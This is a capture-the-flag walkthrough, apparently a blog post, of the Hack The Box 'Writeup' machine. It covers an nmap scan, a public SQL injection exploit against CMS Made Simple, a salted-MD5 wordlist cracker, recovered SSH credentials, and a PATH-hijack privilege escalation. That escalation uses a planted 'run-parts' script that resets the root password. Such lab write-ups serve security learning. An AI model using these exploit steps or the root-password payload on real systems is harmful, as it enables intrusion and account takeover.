# Writeup (HACK THE BOX)

Hey guys today we will be doing Writeup from HackTheBox :) <br/>
<picturelogo>
<br/>

## Nmap Scan
```
[sarthak@sarthak ~]$ nmap -sV 10.10.10.138 -v -Pn
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-13 07:07 IST
NSE: Loaded 43 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 07:07
Completed Parallel DNS resolution of 1 host. at 07:07, 0.01s elapsed
Initiating Connect Scan at 07:07
Scanning 10.10.10.138 [1000 ports]
Discovered open port 80/tcp on 10.10.10.138
Discovered open port 22/tcp on 10.10.10.138
Completed Connect Scan at 07:07, 23.64s elapsed (1000 total ports)
Initiating Service scan at 07:07
Scanning 2 services on 10.10.10.138
Completed Service scan at 07:08, 6.72s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.138.
Initiating NSE at 07:08
Completed NSE at 07:08, 1.27s elapsed
Initiating NSE at 07:08
Completed NSE at 07:08, 0.00s elapsed
Nmap scan report for 10.10.10.138
Host is up (0.31s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.08 seconds

```
<br/>

Two services are running ..let's enumerate apache(port 80)

## Enumerating Web Server

<picture 009>
<br/>
According to the message we can see there's a dos protection waf is working which will an every ip which triggers 40x apache codes...<br/>

So rather than using dirb,gobuster,etc ...we will use burp to spider the domain ..
<br/>
<picture 010>
<br/>
Now we got a new directory named 'writeup' and i am using a really awesome extension named 'wappalyzer' which helped me to find that this directory has **cms made simple** installed...
<br/>
<picture 011>
<br/>

Now i found a blind time based sql injection whose exploit code is available 
 - [here](https://www.exploit-db.com/exploits/46635)

<br/>
<picture 007>
<br/>
```
python2 exp.py -u http://10.10.10.138/writeup/
```
I extracted the decrypt logic from the exploit and saw that before converting to md5 we have to concat it with salt so the final exploit code i created for finding password is
<br/>
```python
import hashlib

def crack_password():
    password="62def4866937f08cc13bab43bb14e6f7"
    output=""
    wordlist="rockyou.txt"
    salt="5a599ef579066807"
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        #print(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            print(output)
            break
    dict.close()


crack_password()
```
<br/>
The password extracted from the wordlist was :- *raykayjay9*

## Logging into ssh

So now we have credentials
 - username:- *jkr*
 - password:- *raykayjay9*
<br/> 
<picture 012>
<br/>

## Privesc 

Downloading pspy64 to snoop on processes
<br/>
<picture 013>
<br/>

Now if a user logged in by ssh we will see some commands being executed in the server which can be seen by pspy64 binary output
<br/>
<picture 014>
<br/>
The command was ...

```
sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
```

if we break this command into chunks and try to understand what it's doing is setting up the PATH variable in which we can see `/usr/local/sbin` was at top which means it will be given highest priority while looking for any binary by the operating system so... 

```
run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
```

we can see `run-parts` is being executed and if we check the permissions of `/usr/local/sbin` we will notice that..

<br/>
<picture 015>
<br/>
our user is in the same group as of `/usr/local/sbin` so that means we can write stuff inside the `sbin` folder, So we will write a binary in /tmp folder with our malicious payload and give it permissions to execute and will copy it to the `sbin` folder...
<br/>
The payload will be..

```bash
#!/bin/bash
echo "root:pwned@123"|chpasswd
```

This will change the password of root to `pwned@123` so let's try this...
<br/>
<picture 016>
<br/>
Now we have copied the payload let's quickly log out and login back to ssh and test the credentials...
<br/>
<picture 017>
<br/>

And we rooted this box ...interesting machine it was,<br/>
<br/>
<meme>
<br/>  
If you guys liked this writeup of writeup lol stay tuned :)

